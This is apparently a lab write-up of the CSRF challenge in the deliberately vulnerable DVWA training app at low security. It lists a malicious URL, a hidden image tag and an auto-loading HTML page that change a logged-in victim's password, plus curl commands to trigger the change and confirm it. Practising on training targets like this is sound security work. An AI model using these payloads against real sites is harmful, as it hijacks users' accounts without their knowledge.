# DVWA CSRF — Low Security

## URL
http://127.0.0.1:4280/vulnerabilities/csrf/

## Vulnerable Parameters
- password_new (GET parameter)
- password_conf (GET parameter)

## Form Details
- Method: GET
- Password change form with "New password" and "Confirm new password" fields
- No CSRF token, no referer check, no current password required

## Source Code Behavior (Low)
- Checks if `password_new == password_conf`
- If match, updates password directly in database
- No anti-CSRF mechanism at all
- GET request — can be triggered via URL/image/link

## Detection
1. Change password normally — observe URL: `?password_new=test&password_conf=test&Change=Change`
2. No CSRF token in the request
3. Password change works via simple GET request without any verification

## Working Payloads

### Direct URL (trick victim into clicking)
```
http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
```

### Hidden image tag (auto-triggers on page load)
```html
<img src="http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none">
```

### HTML page that auto-submits
```html
<html>
<body>
<img src="http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change">
<p>Loading...</p>
</body>
</html>
```

## Step-by-Step Exploitation
1. Log into DVWA as victim
2. Craft malicious URL: `http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=evil&password_conf=evil&Change=Change`
3. Trick victim into visiting this URL (or embed as image on attacker page)
4. Password is changed without victim's knowledge
5. Verify: log out and log in with new password "evil"

## curl Commands
```bash
# Trigger CSRF password change directly
curl -v "http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" \
  -b "PHPSESSID=<session>;security=low"

# Verify the password was changed
curl -v -X POST "http://127.0.0.1:4280/login.php" \
  -d "username=admin&password=hacked&Login=Login"
```

## Notes
- GET-based state change — worst case for CSRF
- No token, no referer check, no re-authentication
- Can be exploited with just a URL or hidden image tag
- Victim just needs to be logged in and click/load the malicious URL
